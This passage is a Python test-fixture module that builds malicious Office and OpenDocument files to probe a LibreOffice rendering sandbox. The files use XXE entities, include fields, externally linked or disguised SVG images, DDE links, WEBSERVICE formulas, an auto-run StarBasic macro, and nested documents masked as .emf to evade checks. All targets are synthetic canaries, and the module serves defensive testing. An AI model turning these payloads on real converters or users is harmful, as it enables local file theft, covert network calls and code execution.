"""Hostile documents for the rendition proof, built byte by byte.

Each vector is the smallest well-formed file that tries one way out of
LibreOffice: reading a local file into the page, reaching the network, or
running a macro. ``Traps`` names the synthetic marker files and the local HTTP
canary a vector aims at, so a test can tell whether anything escaped. Nothing
here touches a real path or host.
"""

from __future__ import annotations

import base64
import gzip
import io
import zipfile
from collections.abc import Callable
from dataclasses import dataclass
from pathlib import Path

CONTENT_TYPES = "http://schemas.openxmlformats.org/package/2006/content-types"
PACKAGE_RELS = "http://schemas.openxmlformats.org/package/2006/relationships"
OFFICE_RELS = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"
WORD = "http://schemas.openxmlformats.org/wordprocessingml/2006/main"
SHEET = "http://schemas.openxmlformats.org/spreadsheetml/2006/main"
SLIDE = "http://schemas.openxmlformats.org/presentationml/2006/main"
DRAWING = "http://schemas.openxmlformats.org/drawingml/2006/main"
PICTURE = "http://schemas.openxmlformats.org/drawingml/2006/picture"
WP = "http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing"
SHEET_DRAWING = "http://schemas.openxmlformats.org/drawingml/2006/spreadsheetDrawing"
XML_HEADER = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
FIRST_PAGE_TEXT = "Harmless rendition probe"


@dataclass(frozen=True, slots=True)
class Traps:
    """Where a vector aims. Every path and URL is synthetic and test-owned."""

    text_url: str
    image_url: str
    csv_url: str
    canary_url: str
    macro_proof: Path

    def canary(self, name: str) -> str:
        return f"{self.canary_url}/{name}"


def _zip(parts: dict[str, str | bytes], *, stored_first: str | None = None) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        if stored_first is not None:
            archive.writestr(stored_first, parts[stored_first], zipfile.ZIP_STORED)
        for name, content in parts.items():
            if name != stored_first:
                archive.writestr(name, content)
    return buffer.getvalue()


def _rels(entries: list[tuple[str, str, str, bool]]) -> str:
    body = "".join(
        f'<Relationship Id="{rid}" Type="{kind}" Target="{target}"'
        f'{" TargetMode=" + chr(34) + "External" + chr(34) if external else ""}/>'
        for rid, kind, target, external in entries
    )
    return f'{XML_HEADER}<Relationships xmlns="{PACKAGE_RELS}">{body}</Relationships>'


def _content_types(overrides: dict[str, str], *, defaults: dict[str, str] | None = None) -> str:
    default_lines = {
        "rels": "application/vnd.openxmlformats-package.relationships+xml",
        "xml": "application/xml",
        **(defaults or {}),
    }
    return (
        f'{XML_HEADER}<Types xmlns="{CONTENT_TYPES}">'
        + "".join(
            f'<Default Extension="{extension}" ContentType="{kind}"/>'
            for extension, kind in default_lines.items()
        )
        + "".join(
            f'<Override PartName="{part}" ContentType="{kind}"/>' for part, kind in overrides.items()
        )
        + "</Types>"
    )


def _paragraph(text: str) -> str:
    return f"<w:p><w:r><w:t>{text}</w:t></w:r></w:p>"


def docx(
    body: str,
    *,
    rels: list[tuple[str, str, str, bool]] | None = None,
    settings: str | None = None,
    settings_rels: list[tuple[str, str, str, bool]] | None = None,
    doctype: str = "",
    extra_parts: dict[str, str | bytes] | None = None,
    extra_types: dict[str, str] | None = None,
    document_encoding: str = "UTF-8",
) -> bytes:
    """A Word file whose body starts with the harmless probe line."""
    overrides = {
        "/word/document.xml": (
            "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"
        ),
        **(extra_types or {}),
    }
    rel_entries = list(rels or [])
    parts: dict[str, str | bytes] = {
        "_rels/.rels": _rels([("rId1", f"{OFFICE_RELS}/officeDocument", "word/document.xml", False)]),
    }
    if settings is not None:
        overrides["/word/settings.xml"] = (
            "application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"
        )
        rel_entries.append(("rIdSettings", f"{OFFICE_RELS}/settings", "settings.xml", False))
        parts["word/settings.xml"] = (
            f'{XML_HEADER}<w:settings xmlns:w="{WORD}" xmlns:r="{OFFICE_RELS}">{settings}</w:settings>'
        )
    if settings_rels is not None:
        parts["word/_rels/settings.xml.rels"] = _rels(settings_rels)
    parts.update(extra_parts or {})
    parts["[Content_Types].xml"] = _content_types(overrides)
    parts["word/_rels/document.xml.rels"] = _rels(rel_entries)
    parts["word/document.xml"] = (
        f'<?xml version="1.0" encoding="{document_encoding}"?>'
        f"{doctype}"
        f'<w:document xmlns:w="{WORD}" xmlns:r="{OFFICE_RELS}" xmlns:wp="{WP}" '
        f'xmlns:a="{DRAWING}" xmlns:pic="{PICTURE}" '
        'xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office">'
        f"<w:body>{_paragraph(FIRST_PAGE_TEXT)}{body}<w:sectPr/></w:body></w:document>"
    ).encode(document_encoding)
    return _zip(parts)


def _picture_xml(attribute: str) -> str:
    return (
        '<pic:pic><pic:nvPicPr><pic:cNvPr id="2" name="trap"/><pic:cNvPicPr/></pic:nvPicPr>'
        f"<pic:blipFill><a:blip {attribute}/><a:stretch><a:fillRect/></a:stretch></pic:blipFill>"
        '<pic:spPr><a:xfrm><a:off x="0" y="0"/><a:ext cx="2000000" cy="2000000"/></a:xfrm>'
        '<a:prstGeom prst="rect"><a:avLst/></a:prstGeom></pic:spPr></pic:pic>'
    )


def _word_picture(attribute: str) -> str:
    return (
        "<w:p><w:r><w:drawing>"
        '<wp:inline distT="0" distB="0" distL="0" distR="0"><wp:extent cx="2000000" cy="2000000"/>'
        '<wp:docPr id="1" name="trap"/>'
        '<a:graphic><a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">'
        f"{_picture_xml(attribute)}</a:graphicData></a:graphic></wp:inline>"
        "</w:drawing></w:r></w:p>"
    )


def _word_field(instruction: str) -> str:
    return (
        '<w:p><w:r><w:fldChar w:fldCharType="begin" w:dirty="true"/></w:r>'
        f'<w:r><w:instrText xml:space="preserve"> {instruction} </w:instrText></w:r>'
        '<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>stale</w:t></w:r>'
        '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'
    )


def _docx_linked_image_file(traps: Traps) -> bytes:
    return docx(
        _word_picture('r:link="rIdTrap"'),
        rels=[("rIdTrap", f"{OFFICE_RELS}/image", traps.image_url, True)],
    )


def _docx_linked_image_http(traps: Traps) -> bytes:
    return docx(
        _word_picture('r:link="rIdTrap"'),
        rels=[("rIdTrap", f"{OFFICE_RELS}/image", traps.canary("docx-image.png"), True)],
    )


def _docx_vml_image_http(traps: Traps) -> bytes:
    shape = (
        '<w:p><w:r><w:pict><v:shape style="width:100pt;height:100pt" stroked="f">'
        f'<v:imagedata src="{traps.canary("docx-vml.png")}" o:title="trap"/>'
        "</v:shape></w:pict></w:r></w:p>"
    )
    return docx(shape)


def _docx_includetext(traps: Traps) -> bytes:
    return docx(_word_field(f'INCLUDETEXT "{traps.text_url}"'))


def _docx_includetext_http(traps: Traps) -> bytes:
    return docx(_word_field(f'INCLUDETEXT "{traps.canary("docx-includetext.txt")}"'))


def _docx_includepicture_file(traps: Traps) -> bytes:
    return docx(_word_field(f'INCLUDEPICTURE "{traps.image_url}"'))


def _docx_includepicture_http(traps: Traps) -> bytes:
    return docx(_word_field(f'INCLUDEPICTURE "{traps.canary("docx-includepicture.png")}" \\d'))


def _docx_link_field(traps: Traps) -> bytes:
    return docx(_word_field(f'LINK Word.Document.12 "{traps.text_url}" "" \\a \\t'))


def _docx_altchunk(traps: Traps) -> bytes:
    return docx(
        '<w:altChunk r:id="rIdTrap"/>',
        rels=[("rIdTrap", f"{OFFICE_RELS}/aFChunk", traps.text_url, True)],
    )


def _docx_subdocument(traps: Traps) -> bytes:
    return docx(
        '<w:p><w:subDoc r:id="rIdTrap"/></w:p>',
        rels=[("rIdTrap", f"{OFFICE_RELS}/subDocument", traps.text_url, True)],
    )


def _docx_attached_template(traps: Traps) -> bytes:
    return docx(
        "",
        settings='<w:attachedTemplate r:id="rIdTrap"/>',
        settings_rels=[
            ("rIdTrap", f"{OFFICE_RELS}/attachedTemplate", traps.canary("docx-template.dotx"), True)
        ],
    )


def _docx_ole_link(traps: Traps) -> bytes:
    shape = (
        '<w:p><w:r><w:object><v:shape id="trap" style="width:100pt;height:100pt"/>'
        '<o:OLEObject Type="Link" ProgID="Word.Document.12" ShapeID="trap" DrawAspect="Content" '
        'r:id="rIdTrap" UpdateMode="Always"/></w:object></w:r></w:p>'
    )
    return docx(
        shape,
        rels=[("rIdTrap", f"{OFFICE_RELS}/oleObject", traps.text_url, True)],
    )


def _docx_entity(traps: Traps) -> bytes:
    doctype = f'<!DOCTYPE d [<!ENTITY trap SYSTEM "{traps.text_url}">]>'
    return docx(_paragraph("&trap;"), doctype=doctype)


def _docx_entity_http(traps: Traps) -> bytes:
    doctype = f'<!DOCTYPE d [<!ENTITY trap SYSTEM "{traps.canary("docx-entity.xml")}">]>'
    return docx(_paragraph("&trap;"), doctype=doctype)


def _svg_with_image(url: str) -> str:
    return (
        '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" '
        'width="200" height="200" viewBox="0 0 200 200">'
        f'<image x="0" y="0" width="200" height="200" xlink:href="{url}" href="{url}"/></svg>'
    )


def _docx_svg_image(url: str) -> bytes:
    return docx(
        _word_picture('r:embed="rIdTrap"'),
        rels=[("rIdTrap", f"{OFFICE_RELS}/image", "media/trap.svg", False)],
        extra_parts={"word/media/trap.svg": _svg_with_image(url)},
        extra_types={"/word/media/trap.svg": "image/svg+xml"},
    )


def _docx_svg_file(traps: Traps) -> bytes:
    return _docx_svg_image(traps.image_url)


def _docx_svg_http(traps: Traps) -> bytes:
    return _docx_svg_image(traps.canary("docx-svg.png"))


def _docx_svg_disguised(traps: Traps) -> bytes:
    """SVG bytes behind a .png name and content type."""
    return docx(
        _word_picture('r:embed="rIdTrap"'),
        rels=[("rIdTrap", f"{OFFICE_RELS}/image", "media/image1.png", False)],
        extra_parts={"word/media/image1.png": _svg_with_image(traps.image_url)},
        extra_types={"/word/media/image1.png": "image/png"},
    )


def _docx_svg_gzip(traps: Traps) -> bytes:
    return docx(
        _word_picture('r:embed="rIdTrap"'),
        rels=[("rIdTrap", f"{OFFICE_RELS}/image", "media/image1.svgz", False)],
        extra_parts={"word/media/image1.svgz": gzip.compress(_svg_with_image(traps.image_url).encode())},
        extra_types={"/word/media/image1.svgz": "image/svg+xml"},
    )


def _docx_svg_utf16(traps: Traps) -> bytes:
    return docx(
        _word_picture('r:embed="rIdTrap"'),
        rels=[("rIdTrap", f"{OFFICE_RELS}/image", "media/trap.svg", False)],
        extra_parts={"word/media/trap.svg": _svg_with_image(traps.image_url).encode("utf-16")},
        extra_types={"/word/media/trap.svg": "image/svg+xml"},
    )


def _docx_svg_nested_data(traps: Traps) -> bytes:
    inner = base64.b64encode(_svg_with_image(traps.image_url).encode()).decode()
    return _docx_svg_image(f"data:image/svg+xml;base64,{inner}")


def _docx_vml_file(traps: Traps) -> bytes:
    shape = (
        '<w:p><w:r><w:pict><v:shape style="width:100pt;height:100pt" stroked="f">'
        f'<v:imagedata src="{traps.image_url}" o:title="trap"/>'
        "</v:shape></w:pict></w:r></w:p>"
    )
    return docx(shape)


def _docx_vml_fill(traps: Traps) -> bytes:
    shape = (
        '<w:p><w:r><w:pict><v:rect style="width:100pt;height:100pt">'
        f'<v:fill type="frame" src="{traps.image_url}"/>'
        "</v:rect></w:pict></w:r></w:p>"
    )
    return docx(shape)


def _docx_embedded_package(traps: Traps) -> bytes:
    inner = docx(
        _word_picture('r:link="rIdTrap"'),
        rels=[("rIdTrap", f"{OFFICE_RELS}/image", traps.image_url, True)],
    )
    shape = (
        '<w:p><w:r><w:object><v:shape id="trap" style="width:100pt;height:100pt"/>'
        '<o:OLEObject Type="Embed" ProgID="Word.Document.12" ShapeID="trap" DrawAspect="Content" '
        'r:id="rIdTrap"/></w:object></w:r></w:p>'
    )
    return docx(
        shape,
        rels=[("rIdTrap", f"{OFFICE_RELS}/package", "embeddings/inner.docx", False)],
        extra_parts={"word/embeddings/inner.docx": inner},
        extra_types={
            "/word/embeddings/inner.docx": (
                "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
            )
        },
    )


def _docx_html_chunk(html: str) -> bytes:
    return docx(
        '<w:altChunk r:id="rIdTrap"/>',
        rels=[("rIdTrap", f"{OFFICE_RELS}/aFChunk", "afchunk.html", False)],
        extra_parts={"word/afchunk.html": html},
        extra_types={"/word/afchunk.html": "text/html"},
    )


def retyped_chunk(image_url: str, *, kind: str = f"{OFFICE_RELS}/image", wrap: str = "{}", **options) -> bytes:
    """A nested HTML chunk behind a relationship that says it is something else.

    LibreOffice finds the chunk by id and never reads the Type. The HTML import
    then reads ``<img>`` sources from any local path, past every profile setting.
    """
    html = f'<html><body><p>chunk</p><img src="{image_url}" width="600" height="760"/></body></html>'
    return docx(
        wrap.format('<w:altChunk r:id="rIdTrap"/>'),
        rels=[("rIdTrap", kind, "afchunk.html", False)],
        extra_parts={"word/afchunk.html": html},
        extra_types={"/word/afchunk.html": "text/html"},
        **options,
    )


def linked_picture(image_url: str) -> bytes:
    """A picture linked by URL, the one read every LibreOffice build does on a stock
    profile. Walled reads are proved with this as well as the HTML chunk, which
    25.2.3 does not import at all."""
    return docx(
        _word_picture('r:link="rIdTrap"'),
        rels=[("rIdTrap", f"{OFFICE_RELS}/image", image_url, True)],
    )


NOT_A_PICTURE = b"<!--" + b"x" * 36 + b" EMF-->"


def _inner_document(body: bytes) -> bytes:
    """A real nested DOCX whose zip opens with an entry placing the EMF signature."""
    buffer = io.BytesIO()
    with zipfile.ZipFile(io.BytesIO(body)) as archive, zipfile.ZipFile(buffer, "w") as inner:
        inner.writestr("0123456789 EMF.xml", b"<a/>")
        for entry in archive.infolist():
            inner.writestr(entry.filename, archive.read(entry))
    return buffer.getvalue()


def masked_nested_document(inner: bytes) -> bytes:
    """A nested DOCX and the body that pulls it in, both behind parts named .emf and
    prefixed so a one-field picture check would wave them through."""
    plain = docx(
        '<w:altChunk r:id="rIdC"/>',
        rels=[("rIdC", f"{OFFICE_RELS}/image", "chunk.emf", False)],
        extra_parts={"word/chunk.emf": _inner_document(inner)},
        extra_types={
            "/word/chunk.emf": (
                "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"
            )
        },
    )
    buffer = io.BytesIO()
    with zipfile.ZipFile(io.BytesIO(plain)) as archive, zipfile.ZipFile(
        buffer, "w", zipfile.ZIP_DEFLATED
    ) as masked:
        for entry in archive.infolist():
            name, data = entry.filename, archive.read(entry)
            if name == "word/document.xml":
                name, data = "word/body.emf", NOT_A_PICTURE + data.split(b"?>", 1)[1]
            elif name == "word/_rels/document.xml.rels":
                name = "word/_rels/body.emf.rels"
            elif name == "_rels/.rels":
                data = data.replace(b"word/document.xml", b"word/body.emf")
            elif name == "[Content_Types].xml":
                data = data.replace(b'PartName="/word/document.xml"', b'PartName="/word/body.emf"')
            masked.writestr(name, data)
    return buffer.getvalue()


NESTED_WORDS = "Masked nested words"


def inert_nested_document() -> bytes:
    return masked_nested_document(docx(f"<w:p><w:r><w:t>{NESTED_WORDS}</w:t></w:r></w:p>"))


def _docx_masked_nested_document(_traps: Traps) -> bytes:
    return inert_nested_document()


def _docx_retyped_chunk_file(traps: Traps) -> bytes:
    return retyped_chunk(traps.image_url)


def _docx_retyped_chunk_http(traps: Traps) -> bytes:
    return retyped_chunk(traps.canary("docx-retyped-chunk.png"))


def _docx_unknown_type_chunk(traps: Traps) -> bytes:
    return retyped_chunk(traps.image_url, kind="urn:not-a-chunk")


def _docx_utf16_chunk(traps: Traps) -> bytes:
    return retyped_chunk(traps.image_url, document_encoding="UTF-16")


def _docx_alternate_content_chunk(traps: Traps) -> bytes:
    wrap = (
        '<mc:AlternateContent xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006">'
        '<mc:Choice Requires="w">{}</mc:Choice></mc:AlternateContent>'
    )
    return retyped_chunk(traps.image_url, wrap=wrap)


_HYPERLINK = f"{OFFICE_RELS}/hyperlink"


def _docx_hyperlink_typed_image_file(traps: Traps) -> bytes:
    return docx(_word_picture('r:link="rIdTrap"'), rels=[("rIdTrap", _HYPERLINK, traps.image_url, True)])


def _docx_hyperlink_typed_image_http(traps: Traps) -> bytes:
    return docx(
        _word_picture('r:link="rIdTrap"'),
        rels=[("rIdTrap", _HYPERLINK, traps.canary("docx-hyperlink-typed.png"), True)],
    )


def _docx_internal_absolute_target(traps: Traps) -> bytes:
    return docx(
        _word_picture('r:embed="rIdTrap"'),
        rels=[("rIdTrap", f"{OFFICE_RELS}/image", traps.image_url, False)],
    )


def _docx_html_chunk_file(traps: Traps) -> bytes:
    return _docx_html_chunk(f'<html><body><img src="{traps.image_url}"/></body></html>')


def _docx_html_chunk_http(traps: Traps) -> bytes:
    return _docx_html_chunk(f'<html><body><img src="{traps.canary("docx-chunk.png")}"/></body></html>')


OFFICE = "urn:oasis:names:tc:opendocument:xmlns:office:1.0"
ODF_NAMESPACES = (
    f'xmlns:office="{OFFICE}" '
    'xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" '
    'xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" '
    'xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0" '
    'xmlns:style="urn:oasis:names:tc:opendocument:xmlns:style:1.0" '
    'xmlns:svg="urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0" '
    'xmlns:fo="urn:oasis:names:tc:opendocument:xmlns:xsl-fo-compatible:1.0" '
    'xmlns:presentation="urn:oasis:names:tc:opendocument:xmlns:presentation:1.0" '
    'xmlns:config="urn:oasis:names:tc:opendocument:xmlns:config:1.0" '
    'xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" '
    'xmlns:of="urn:oasis:names:tc:opendocument:xmlns:of:1.2" '
    'xmlns:xlink="http://www.w3.org/1999/xlink" '
    'xmlns:ooo="http://openoffice.org/2004/office" '
    'xmlns:ooow="http://openoffice.org/2004/writer" '
    'xmlns:oooc="http://openoffice.org/2004/calc" '
)
ODF_MANIFEST = "urn:oasis:names:tc:opendocument:xmlns:manifest:1.0"
_ODT = "application/vnd.oasis.opendocument.text"
_ODS = "application/vnd.oasis.opendocument.spreadsheet"
_ODP = "application/vnd.oasis.opendocument.presentation"


def odf(
    mimetype: str,
    body: str,
    *,
    automatic_styles: str = "",
    font_faces: str = "",
    scripts: str = "",
    settings: str = "",
    doctype: str = "",
    extra: dict[str, str] | None = None,
) -> bytes:
    """An OpenDocument package holding ``body`` as ``office:body``."""
    manifest_entries = [("/", mimetype), ("content.xml", "text/xml")]
    parts: dict[str, str | bytes] = {"mimetype": mimetype}
    parts["content.xml"] = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        f"{doctype}"
        f'<office:document-content {ODF_NAMESPACES} office:version="1.3">'
        f"{scripts}<office:font-face-decls>{font_faces}</office:font-face-decls>"
        f"<office:automatic-styles>{automatic_styles}</office:automatic-styles>"
        f"<office:body>{body}</office:body></office:document-content>"
    )
    if settings:
        manifest_entries.append(("settings.xml", "text/xml"))
        parts["settings.xml"] = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            f'<office:document-settings {ODF_NAMESPACES} office:version="1.3">'
            f"<office:settings>{settings}</office:settings></office:document-settings>"
        )
    for name, content in (extra or {}).items():
        manifest_entries.append((name, "text/xml"))
        parts[name] = content
    parts["META-INF/manifest.xml"] = (
        f'<?xml version="1.0" encoding="UTF-8"?><manifest:manifest xmlns:manifest="{ODF_MANIFEST}" '
        'manifest:version="1.3">'
        + "".join(
            f'<manifest:file-entry manifest:full-path="{path}" manifest:media-type="{kind}"/>'
            for path, kind in manifest_entries
        )
        + "</manifest:manifest>"
    )
    return _zip(parts, stored_first="mimetype")


def _odt_text(content: str) -> str:
    return f"<office:text><text:p>{FIRST_PAGE_TEXT}</text:p>{content}</office:text>"


def _odf_frame(content: str) -> str:
    return (
        '<draw:frame draw:name="trap" text:anchor-type="paragraph" svg:width="6cm" svg:height="6cm">'
        f"{content}</draw:frame>"
    )


_LINKS_ALWAYS = (
    '<config:config-item-set config:name="ooo:configuration-settings">'
    '<config:config-item config:name="LinkUpdateMode" config:type="short">2</config:config-item>'
    "</config:config-item-set>"
)


def _odt_linked_image_file(traps: Traps) -> bytes:
    image = f'<draw:image xlink:href="{traps.image_url}" xlink:type="simple"/>'
    return odf(_ODT, _odt_text(f"<text:p>{_odf_frame(image)}</text:p>"))


def _odt_linked_image_http(traps: Traps) -> bytes:
    image = f'<draw:image xlink:href="{traps.canary("odt-image.png")}" xlink:type="simple"/>'
    return odf(_ODT, _odt_text(f"<text:p>{_odf_frame(image)}</text:p>"))


def _odt_section(url: str) -> bytes:
    section = (
        '<text:section text:name="trap">'
        f'<text:section-source xlink:href="{url}" xlink:type="simple" text:filter-name="Text"/>'
        "</text:section>"
    )
    return odf(_ODT, _odt_text(section), settings=_LINKS_ALWAYS)


def _odt_section_file(traps: Traps) -> bytes:
    return _odt_section(traps.text_url)


def _odt_section_http(traps: Traps) -> bytes:
    return _odt_section(traps.canary("odt-section.txt"))


def _odt_dde(traps: Traps) -> bytes:
    declarations = (
        "<text:dde-connection-decls>"
        '<text:dde-connection-decl office:name="trap" office:dde-application="soffice" '
        f'office:dde-topic="{traps.text_url}" office:dde-item="" office:automatic-update="true"/>'
        "</text:dde-connection-decls>"
    )
    content = (
        f"<text:p>{FIRST_PAGE_TEXT}</text:p>"
        '<text:p><text:dde-connection text:connection-name="trap">stale</text:dde-connection></text:p>'
    )
    return odf(
        _ODT, f"<office:text>{declarations}{content}</office:text>", settings=_LINKS_ALWAYS
    )


def _odt_ole_link(traps: Traps) -> bytes:
    linked = (
        f'<draw:object xlink:href="{traps.text_url}" xlink:type="simple" '
        'xlink:show="embed" xlink:actuate="onLoad"/>'
    )
    return odf(_ODT, _odt_text(f"<text:p>{_odf_frame(linked)}</text:p>"), settings=_LINKS_ALWAYS)


def _odt_floating_frame(traps: Traps) -> bytes:
    frame = (
        f'<draw:floating-frame xlink:href="{traps.canary("odt-frame.html")}" '
        'xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>'
    )
    return odf(_ODT, _odt_text(f"<text:p>{_odf_frame(frame)}</text:p>"))


def _odt_font_face(traps: Traps) -> bytes:
    faces = (
        '<style:font-face style:name="Trap" svg:font-family="Trap"><svg:font-face-src>'
        f'<svg:font-face-uri xlink:href="{traps.canary("odt-font.ttf")}" xlink:type="simple"/>'
        "</svg:font-face-src></style:font-face>"
    )
    styles = (
        '<style:style style:name="P1" style:family="paragraph">'
        '<style:text-properties style:font-name="Trap"/></style:style>'
    )
    body = f'<office:text><text:p text:style-name="P1">{FIRST_PAGE_TEXT}</text:p></office:text>'
    return odf(_ODT, body, font_faces=faces, automatic_styles=styles)


def _odt_background(traps: Traps) -> bytes:
    styles = (
        '<style:style style:name="P1" style:family="paragraph"><style:paragraph-properties>'
        f'<style:background-image xlink:href="{traps.canary("odt-background.png")}" '
        'xlink:type="simple" xlink:actuate="onLoad"/>'
        "</style:paragraph-properties></style:style>"
    )
    body = f'<office:text><text:p text:style-name="P1">{FIRST_PAGE_TEXT}</text:p></office:text>'
    return odf(_ODT, body, automatic_styles=styles)


def _odt_svg(url: str) -> bytes:
    image = '<draw:image xlink:href="Pictures/trap.svg" xlink:type="simple"/>'
    return odf(
        _ODT,
        _odt_text(f"<text:p>{_odf_frame(image)}</text:p>"),
        extra={"Pictures/trap.svg": _svg_with_image(url)},
    )


def _odt_svg_file(traps: Traps) -> bytes:
    return _odt_svg(traps.image_url)


def _odt_svg_http(traps: Traps) -> bytes:
    return _odt_svg(traps.canary("odt-svg.png"))


def _odt_binary_svg(traps: Traps) -> bytes:
    encoded = base64.b64encode(_svg_with_image(traps.image_url).encode()).decode()
    image = f"<draw:image><office:binary-data>{encoded}</office:binary-data></draw:image>"
    return odf(_ODT, _odt_text(f"<text:p>{_odf_frame(image)}</text:p>"))


def _odt_nested_object(traps: Traps) -> bytes:
    nested = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        f'<office:document-content {ODF_NAMESPACES} office:version="1.3"><office:body>'
        f'<office:text><text:p>{_odf_frame(f"""<draw:image xlink:href="{traps.image_url}" xlink:type="simple"/>""")}'
        "</text:p></office:text></office:body></office:document-content>"
    )
    frame = _odf_frame('<draw:object xlink:href="./Object 1" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>')
    return odf(
        _ODT,
        _odt_text(f"<text:p>{frame}</text:p>"),
        extra={"Object 1/content.xml": nested, "Object 1/mimetype": _ODT},
    )


_META_NAMESPACES = (
    f'xmlns:office="{OFFICE}" xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0" '
    'xmlns:xlink="http://www.w3.org/1999/xlink"'
)


def _odt_meta_template(traps: Traps) -> bytes:
    meta = (
        f'<?xml version="1.0" encoding="UTF-8"?><office:document-meta {_META_NAMESPACES} '
        'office:version="1.3"><office:meta><meta:template xlink:type="simple" '
        f'xlink:actuate="onRequest" xlink:title="x" xlink:href="{traps.canary("odt-meta.ott")}"/>'
        "</office:meta></office:document-meta>"
    )
    return odf(_ODT, _odt_text(""), extra={"meta.xml": meta})


def _odt_xforms_instance(url: str) -> bytes:
    forms = (
        '<office:forms><xforms:model xmlns:xforms="http://www.w3.org/2002/xforms">'
        f'<xforms:instance src="{url}" id="i1"/></xforms:model></office:forms>'
    )
    return odf(_ODT, f"<office:text>{forms}<text:p>{FIRST_PAGE_TEXT}</text:p></office:text>")


def _odt_xforms_http(traps: Traps) -> bytes:
    return _odt_xforms_instance(traps.canary("odt-xforms.xml"))


def _odt_xforms_file(traps: Traps) -> bytes:
    return _odt_xforms_instance(traps.text_url)


def _odt_encoded_traversal(traps: Traps) -> bytes:
    image = '<draw:image xlink:href="%2e%2e/%2e%2e/marker.png" xlink:type="simple"/>'
    return odf(_ODT, _odt_text(f"<text:p>{_odf_frame(image)}</text:p>"))


def _odt_entity(traps: Traps) -> bytes:
    doctype = f'<!DOCTYPE d [<!ENTITY trap SYSTEM "{traps.text_url}">]>'
    return odf(_ODT, _odt_text("<text:p>&trap;</text:p>"), doctype=doctype)


def _odt_macro(traps: Traps) -> bytes:
    """Writes a proof file if the on-load event is ever allowed to run."""
    macro = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">'
        '<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" '
        'script:language="StarBasic">'
        "Sub Proof\n"
        "  n = FreeFile\n"
        f'  Open "{traps.macro_proof}" For Output As #n\n'
        '  Print #n, "macro ran"\n'
        "  Close #n\n"
        "End Sub\n"
        "</script:module>"
    )
    library_container = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE library:libraries PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" '
        '"libraries.dtd"><library:libraries xmlns:library="http://openoffice.org/2000/library" '
        'xmlns:xlink="http://www.w3.org/1999/xlink">'
        '<library:library library:name="Standard" library:link="false"/></library:libraries>'
    )
    library = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE library:library PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" '
        '"library.dtd"><library:library xmlns:library="http://openoffice.org/2000/library" '
        'library:name="Standard" library:readonly="false" library:passwordprotected="false">'
        '<library:element library:name="Module1"/></library:library>'
    )
    listeners = (
        "<office:scripts><office:event-listeners>"
        '<script:event-listener script:language="ooo:script" script:event-name="dom:load" '
        'xlink:href="vnd.sun.star.script:Standard.Module1.Proof?language=Basic&amp;location=document" '
        'xlink:type="simple"/>'
        "</office:event-listeners></office:scripts>"
    )
    return odf(
        _ODT,
        _odt_text(""),
        scripts=listeners,
        extra={
            "Basic/script-lc.xml": library_container,
            "Basic/Standard/script-lb.xml": library,
            "Basic/Standard/Module1.xml": macro,
        },
    )


def _ods_table(cells: str, prefix: str = "") -> str:
    return (
        f"<office:spreadsheet>{prefix}<table:table table:name=\"Sheet1\">"
        '<table:table-column/>'
        f'<table:table-row><table:table-cell office:value-type="string"><text:p>{FIRST_PAGE_TEXT}'
        f"</text:p></table:table-cell></table:table-row><table:table-row>{cells}</table:table-row>"
        "</table:table></office:spreadsheet>"
    )


def _ods_formula(formula: str) -> bytes:
    cell = f'<table:table-cell table:formula="{formula}" office:value-type="string"/>'
    return odf(_ODS, _ods_table(cell))


def _ods_webservice_http(traps: Traps) -> bytes:
    return _ods_formula(f'of:=COM.MICROSOFT.WEBSERVICE(&quot;{traps.canary("ods-web.txt")}&quot;)')


def _ods_webservice_file(traps: Traps) -> bytes:
    return _ods_formula(f"of:=COM.MICROSOFT.WEBSERVICE(&quot;{traps.text_url}&quot;)")


def _ods_dde(traps: Traps) -> bytes:
    return _ods_formula(f"of:=DDE(&quot;soffice&quot;;&quot;{traps.text_url}&quot;;&quot;&quot;)")


def _ods_external_reference(traps: Traps) -> bytes:
    return _ods_formula(f"of:=['{traps.csv_url}'#$marker.A1]")


def _ods_table_source(traps: Traps) -> bytes:
    table = (
        '<table:table table:name="Linked">'
        f'<table:table-source xlink:type="simple" xlink:href="{traps.csv_url}" '
        'table:filter-name="Text - txt - csv (StarCalc)" table:mode="copy-all" '
        'table:refresh-delay="PT0S"/>'
        "<table:table-column/><table:table-row><table:table-cell/></table:table-row></table:table>"
    )
    body = _ods_table('<table:table-cell/>').replace("</office:spreadsheet>", f"{table}</office:spreadsheet>")
    return odf(_ODS, body)


def _ods_cell_range_link(traps: Traps) -> bytes:
    source = (
        f'<table:cell-range-source table:name="trap" xlink:type="simple" xlink:href="{traps.csv_url}" '
        'table:filter-name="Text - txt - csv (StarCalc)" table:filter-options="" '
